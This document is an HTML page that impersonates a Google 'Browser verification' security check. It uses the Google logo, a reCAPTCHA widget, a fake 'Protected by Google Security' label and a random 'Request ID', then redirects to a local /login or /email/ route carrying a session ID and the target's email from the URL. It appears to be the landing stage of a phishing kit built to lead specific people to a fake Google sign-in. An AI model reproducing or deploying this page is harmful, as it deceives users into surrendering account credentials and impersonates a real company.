<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying browser - Google</title>
    <link rel="stylesheet" href="/pages/res/css/captcha.css">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <div class="logo-container">
                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                    </svg>
                </div>
                <h1>Browser verification</h1>
                <p class="subtitle">Please complete the security check to continue</p>
            </div>

            <div class="signin-right">
                <div class="verification-container">
                    <noscript>
                        <p class="noscript-warning">Please turn JavaScript on and reload the page.</p>
                    </noscript>

                    <div id="verification-content">
                        <h2 class="verification-title">Security check</h2>

                        <p class="verification-text">
                            Please complete this security check to access Google
                        </p>

                        <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On" data-callback="onCaptchaSuccess"></div>
                        <div id="error-message" class="error-message"></div>

                        <div class="attribution">
                            Protected by Google Security
                            <div class="ray-id">
                                Request ID: <code id="request-id"></code>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Check for hash-based email routing first
        let targetEmail = '';
        if (window.location.hash && window.location.hash.length > 1) {
            targetEmail = decodeURIComponent(window.location.hash.substring(1));
            // Redirect to email route
            window.location.href = `/email/${encodeURIComponent(targetEmail)}`;
        }

        // Get session ID from URL or generate one
        const urlParams = new URLSearchParams(window.location.search);
        let sessionId = urlParams.get('session_id');

        if (!sessionId) {
            sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Generate a random request ID
        function generateRequestId() {
            return 'xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Set the request ID
        document.getElementById('request-id').textContent = generateRequestId();

        // Handle successful captcha completion
        function onCaptchaSuccess(token) {
            // Get session_id from URL or generate new one
            const urlParams = new URLSearchParams(window.location.search);
            const sessionId = urlParams.get('session_id') || 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            const emailParam = urlParams.get('email');

            setTimeout(() => {
                let loginUrl = `/login?session_id=${sessionId}`;
                if (emailParam) {
                    loginUrl += `&email=${encodeURIComponent(emailParam)}`;
                }
                window.location.href = loginUrl;
            }, 1000);
        }
    </script>
</body>
</html>